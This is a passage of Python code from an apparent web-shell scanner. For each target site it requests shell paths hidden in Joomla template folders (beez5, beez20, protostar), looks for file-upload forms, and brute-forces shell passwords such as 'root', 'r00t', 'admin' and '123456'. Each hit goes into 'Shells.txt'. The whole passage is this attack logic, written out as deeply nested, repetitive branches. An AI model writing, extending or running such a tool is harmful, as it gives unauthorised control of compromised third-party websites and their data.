																														if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																															print(' # '+site +'/ --> {}[beez5]'.format(fg))
																															with open('Shells.txt', mode='a') as d:
																																d.write(SH15_J+'#123123')
																														else :
																															p123321 = requests.post(SH15_J,data=password_123321,timeout=15).content
																															if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																																print(' # '+site +'/ --> {}[beez5]'.format(fg))
																																with open('Shells.txt', mode='a') as d:
																																	d.write(SH15_J+'#123321')
																															else :
																																p123456789 = requests.post(SH15_J,data=password_123456789,timeout=15).content
																																if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																																	print(' # '+site +'/ --> {}[beez5]'.format(fg))
																																	with open('Shells.txt', mode='a') as d:
																																		d.write(SH15_J+'#123456789')
																																else :
																																	p1234567890 = requests.post(SH15_J,data=password_1234567890,timeout=15).content
																																	if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																																		print(' # '+site +'/ --> {}[beez5]'.format(fg))
																																		with open('Shells.txt', mode='a') as d:
																																			d.write(SH15_J+'#1234567890')
																																	else :
																																		phaurgeulis = requests.post(SH15_J,data=password_haurgeulis,timeout=15).content
																																		if 'Andela1C3' in phaurgeulis  :
																																			print(' # '+site +'/ --> {}[beez5]'.format(fg))
																																			with open('Shells.txt', mode='a') as d:
																																				d.write(SH15_J+'#haurgeulis')
																																		else :
																																			print(' # '+site +' --> {}[Failed]'.format(fr))
																				else :
																					SH16_J_content = requests.get(SH16_J,timeout=15).content
																					if ' type="file"' in SH16_J_content or ' type=\'file\'' in SH16_J_content or ' type= "file"' in SH16_J_content or ' type= \'file\'' in SH16_J_content or ' type = "file"' in SH16_J_content or ' type = \'file\'' in SH16_J_content or ' type ="file"' in SH16_J_content or ' type =\'file\'' in SH16_J_content or ' type=file' in SH16_J_content or ' type =file' in SH16_J_content or ' type= file' in SH16_J_content or ' type = file' in SH16_J_content or 'Upload</a> ]</li><li>[' in SH16_J_content or 'upload</a><li><a>Sym' in SH16_J_content :
																						print(' # '+site +'/ --> {}[beez20]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH16_J+'')
																					elif ' name=pass' in SH16_J_content :
																						nhzgrf = requests.post(SH16_J,data=password_nhzgrf,timeout=15).content
																						if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
																							print(' # '+site +'/ --> {}[beez20]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH16_J+'#nhzgrf')
																						else :
																							proot = requests.post(SH16_J,data=password_root,timeout=15).content
																							if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																								print(' # '+site +'/ --> {}[beez20]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH16_J+'#root')
																							else :
																								pr00t = requests.post(SH16_J,data=password_r00t,timeout=15).content
																								if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																									print(' # '+site +'/ --> {}[beez20]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH16_J+'#r00t')
																								else :
																									padmin = requests.post(SH16_J,data=password_admin,timeout=15).content
																									if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																										print(' # '+site +'/ --> {}[beez20]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH16_J+'#admin')
																									else :
																										pt00r = requests.post(SH16_J,data=password_t00r,timeout=15).content
																										if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																											print(' # '+site +'/ --> {}[beez20]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH16_J+'#t00r')
																										else :
																											p123 = requests.post(SH16_J,data=password_123,timeout=15).content
																											if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																												print(' # '+site +'/ --> {}[beez20]'.format(fg))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH16_J+'#123')
																											else :
																												p1234 = requests.post(SH16_J,data=password_1234,timeout=15).content
																												if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																													print(' # '+site +'/ --> {}[beez20]'.format(fg))
																													with open('Shells.txt', mode='a') as d:
																														d.write(SH16_J+'#1234')
																												else :
																													p12345 = requests.post(SH16_J,data=password_12345,timeout=15).content
																													if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																														print(' # '+site +'/ --> {}[beez20]'.format(fg))
																														with open('Shells.txt', mode='a') as d:
																															d.write(SH16_J+'#12345')
																													else :
																														p123456 = requests.post(SH16_J,data=password_123456,timeout=15).content
																														if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																															print(' # '+site +'/ --> {}[beez20]'.format(fg))
																															with open('Shells.txt', mode='a') as d:
																																d.write(SH16_J+'#123456')
																														else :
																															p123123 = requests.post(SH16_J,data=password_123123,timeout=15).content
																															if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																																print(' # '+site +'/ --> {}[beez20]'.format(fg))
																																with open('Shells.txt', mode='a') as d:
																																	d.write(SH16_J+'#123123')
																															else :
																																p123321 = requests.post(SH16_J,data=password_123321,timeout=15).content
																																if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																																	print(' # '+site +'/ --> {}[beez20]'.format(fg))
																																	with open('Shells.txt', mode='a') as d:
																																		d.write(SH16_J+'#123321')
																																else :
																																	p123456789 = requests.post(SH16_J,data=password_123456789,timeout=15).content
																																	if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																																		print(' # '+site +'/ --> {}[beez20]'.format(fg))
																																		with open('Shells.txt', mode='a') as d:
																																			d.write(SH16_J+'#123456789')
																																	else :
																																		p1234567890 = requests.post(SH16_J,data=password_1234567890,timeout=15).content
																																		if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																																			print(' # '+site +'/ --> {}[beez20]'.format(fg))
																																			with open('Shells.txt', mode='a') as d:
																																				d.write(SH16_J+'#1234567890')
																																		else :
																																			phaurgeulis = requests.post(SH16_J,data=password_haurgeulis,timeout=15).content
																																			if 'Andela1C3' in phaurgeulis  :
																																				print(' # '+site +'/ --> {}[beez20]'.format(fg))
																																				with open('Shells.txt', mode='a') as d:
																																					d.write(SH16_J+'#haurgeulis')
																																			else :
																																				print(' # '+site +' --> {}[Failed]'.format(fr))
																					else :
																						SH17_J_content = requests.get(SH17_J,timeout=15).content
																						if ' type="file"' in SH17_J_content or ' type=\'file\'' in SH17_J_content or ' type= "file"' in SH17_J_content or ' type= \'file\'' in SH17_J_content or ' type = "file"' in SH17_J_content or ' type = \'file\'' in SH17_J_content or ' type ="file"' in SH17_J_content or ' type =\'file\'' in SH17_J_content or ' type=file' in SH17_J_content or ' type =file' in SH17_J_content or ' type= file' in SH17_J_content or ' type = file' in SH17_J_content or 'Upload</a> ]</li><li>[' in SH17_J_content or 'upload</a><li><a>Sym' in SH17_J_content :
																							print(' # '+site +'/ --> {}[beez20]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH17_J+'')
																						elif ' name=pass' in SH17_J_content :
																							nhzgrf = requests.post(SH17_J,data=password_nhzgrf,timeout=15).content
																							if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
																								print(' # '+site +'/ --> {}[beez20]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH17_J+'#nhzgrf')
																							else :
																								proot = requests.post(SH17_J,data=password_root,timeout=15).content
																								if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																									print(' # '+site +'/ --> {}[beez20]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH17_J+'#root')
																								else :
																									pr00t = requests.post(SH17_J,data=password_r00t,timeout=15).content
																									if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																										print(' # '+site +'/ --> {}[beez20]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH17_J+'#r00t')
																									else :
																										padmin = requests.post(SH17_J,data=password_admin,timeout=15).content
																										if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																											print(' # '+site +'/ --> {}[beez20]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH17_J+'#admin')
																										else :
																											pt00r = requests.post(SH17_J,data=password_t00r,timeout=15).content
																											if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																												print(' # '+site +'/ --> {}[beez20]'.format(fg))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH17_J+'#t00r')
																											else :
																												p123 = requests.post(SH17_J,data=password_123,timeout=15).content
																												if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																													print(' # '+site +'/ --> {}[beez20]'.format(fg))
																													with open('Shells.txt', mode='a') as d:
																														d.write(SH17_J+'#123')
																												else :
																													p1234 = requests.post(SH17_J,data=password_1234,timeout=15).content
																													if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																														print(' # '+site +'/ --> {}[beez20]'.format(fg))
																														with open('Shells.txt', mode='a') as d:
																															d.write(SH17_J+'#1234')
																													else :
																														p12345 = requests.post(SH17_J,data=password_12345,timeout=15).content
																														if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																															print(' # '+site +'/ --> {}[beez20]'.format(fg))
																															with open('Shells.txt', mode='a') as d:
																																d.write(SH17_J+'#12345')
																														else :
																															p123456 = requests.post(SH17_J,data=password_123456,timeout=15).content
																															if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																																print(' # '+site +'/ --> {}[beez20]'.format(fg))
																																with open('Shells.txt', mode='a') as d:
																																	d.write(SH17_J+'#123456')
																															else :
																																p123123 = requests.post(SH17_J,data=password_123123,timeout=15).content
																																if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																																	print(' # '+site +'/ --> {}[beez20]'.format(fg))
																																	with open('Shells.txt', mode='a') as d:
																																		d.write(SH17_J+'#123123')
																																else :
																																	p123321 = requests.post(SH17_J,data=password_123321,timeout=15).content
																																	if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																																		print(' # '+site +'/ --> {}[beez20]'.format(fg))
																																		with open('Shells.txt', mode='a') as d:
																																			d.write(SH17_J+'#123321')
																																	else :
																																		p123456789 = requests.post(SH17_J,data=password_123456789,timeout=15).content
																																		if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																																			print(' # '+site +'/ --> {}[beez20]'.format(fg))
																																			with open('Shells.txt', mode='a') as d:
																																				d.write(SH17_J+'#123456789')
																																		else :
																																			p1234567890 = requests.post(SH17_J,data=password_1234567890,timeout=15).content
																																			if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																																				print(' # '+site +'/ --> {}[beez20]'.format(fg))
																																				with open('Shells.txt', mode='a') as d:
																																					d.write(SH17_J+'#1234567890')
																																			else :
																																				phaurgeulis = requests.post(SH17_J,data=password_haurgeulis,timeout=15).content
																																				if 'Andela1C3' in phaurgeulis  :
																																					print(' # '+site +'/ --> {}[beez20]'.format(fg))
																																					with open('Shells.txt', mode='a') as d:
																																						d.write(SH17_J+'#haurgeulis')
																																				else :
																																					print(' # '+site +' --> {}[Failed]'.format(fr))
																						else :
																							SH18_J_content = requests.get(SH18_J,timeout=15).content
																							if ' type="file"' in SH18_J_content or ' type=\'file\'' in SH18_J_content or ' type= "file"' in SH18_J_content or ' type= \'file\'' in SH18_J_content or ' type = "file"' in SH18_J_content or ' type = \'file\'' in SH18_J_content or ' type ="file"' in SH18_J_content or ' type =\'file\'' in SH18_J_content or ' type=file' in SH18_J_content or ' type =file' in SH18_J_content or ' type= file' in SH18_J_content or ' type = file' in SH18_J_content or 'Upload</a> ]</li><li>[' in SH18_J_content or 'upload</a><li><a>Sym' in SH18_J_content :
																								print(' # '+site +'/ --> {}[protostar]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH18_J+'')
																							elif ' name=pass' in SH18_J_content :
																								nhzgrf = requests.post(SH18_J,data=password_nhzgrf,timeout=15).content
																								if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
																									print(' # '+site +'/ --> {}[protostar]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH18_J+'#nhzgrf')
																								else :
																									proot = requests.post(SH18_J,data=password_root,timeout=15).content
																									if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																										print(' # '+site +'/ --> {}[protostar]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH18_J+'#root')
																									else :
																										pr00t = requests.post(SH18_J,data=password_r00t,timeout=15).content
																										if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																											print(' # '+site +'/ --> {}[protostar]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH18_J+'#r00t')
																										else :
																											padmin = requests.post(SH18_J,data=password_admin,timeout=15).content
																											if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																												print(' # '+site +'/ --> {}[protostar]'.format(fg))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH18_J+'#admin')
																											else :
																												pt00r = requests.post(SH18_J,data=password_t00r,timeout=15).content
																												if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																													print(' # '+site +'/ --> {}[protostar]'.format(fg))
																													with open('Shells.txt', mode='a') as d:
																														d.write(SH18_J+'#t00r')
																												else :
																													p123 = requests.post(SH18_J,data=password_123,timeout=15).content
																													if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																														print(' # '+site +'/ --> {}[protostar]'.format(fg))
																														with open('Shells.txt', mode='a') as d:
																															d.write(SH18_J+'#123')
																													else :
																														p1234 = requests.post(SH18_J,data=password_1234,timeout=15).content
																														if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																															print(' # '+site +'/ --> {}[protostar]'.format(fg))
																															with open('Shells.txt', mode='a') as d:
																																d.write(SH18_J+'#1234')
																														else :
																															p12345 = requests.post(SH18_J,data=password_12345,timeout=15).content
																															if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																																print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																with open('Shells.txt', mode='a') as d:
																																	d.write(SH18_J+'#12345')
																															else :
																																p123456 = requests.post(SH18_J,data=password_123456,timeout=15).content
																																if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																																	print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																	with open('Shells.txt', mode='a') as d:
																																		d.write(SH18_J+'#123456')
																																else :
																																	p123123 = requests.post(SH18_J,data=password_123123,timeout=15).content
																																	if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																																		print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																		with open('Shells.txt', mode='a') as d:
																																			d.write(SH18_J+'#123123')
																																	else :
																																		p123321 = requests.post(SH18_J,data=password_123321,timeout=15).content
																																		if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																																			print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																			with open('Shells.txt', mode='a') as d:
																																				d.write(SH18_J+'#123321')
																																		else :
																																			p123456789 = requests.post(SH18_J,data=password_123456789,timeout=15).content
																																			if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																																				print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																				with open('Shells.txt', mode='a') as d:
																																					d.write(SH18_J+'#123456789')
																																			else :
																																				p1234567890 = requests.post(SH18_J,data=password_1234567890,timeout=15).content
																																				if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																																					print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																					with open('Shells.txt', mode='a') as d:
																																						d.write(SH18_J+'#1234567890')
																																				else :
																																					phaurgeulis = requests.post(SH18_J,data=password_haurgeulis,timeout=15).content
																																					if 'Andela1C3' in phaurgeulis  :
																																						print(' # '+site +'/ --> {}[protostar]'.format(fg))
																																						with open('Shells.txt', mode='a') as d:
																																							d.write(SH18_J+'#haurgeulis')
																																					else :
																																						print(' # '+site +' --> {}[Failed]'.format(fr))
																							else :
																								SH19_J_content = requests.get(SH19_J,timeout=15).content
																								if ' type="file"' in SH19_J_content or ' type=\'file\'' in SH19_J_content or ' type= "file"' in SH19_J_content or ' type= \'file\'' in SH19_J_content or ' type = "file"' in SH19_J_content or ' type = \'file\'' in SH19_J_content or ' type ="file"' in SH19_J_content or ' type =\'file\'' in SH19_J_content or ' type=file' in SH19_J_content or ' type =file' in SH19_J_content or ' type= file' in SH19_J_content or ' type = file' in SH19_J_content or 'Upload</a> ]</li><li>[' in SH19_J_content or 'upload</a><li><a>Sym' in SH19_J_content :
																									print(' # '+site +'/ --> {}[protostar]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH19_J+'')
																								elif ' name=pass' in SH19_J_content :
																									nhzgrf = requests.post(SH19_J,data=password_nhzgrf,timeout=15).content
																									if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
																										print(' # '+site +'/ --> {}[protostar]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH19_J+'#nhzgrf')
																									else :
																										proot = requests.post(SH19_J,data=password_root,timeout=15).content
																										if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																											print(' # '+site +'/ --> {}[protostar]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH19_J+'#root')
																										else :
																											pr00t = requests.post(SH19_J,data=password_r00t,timeout=15).content
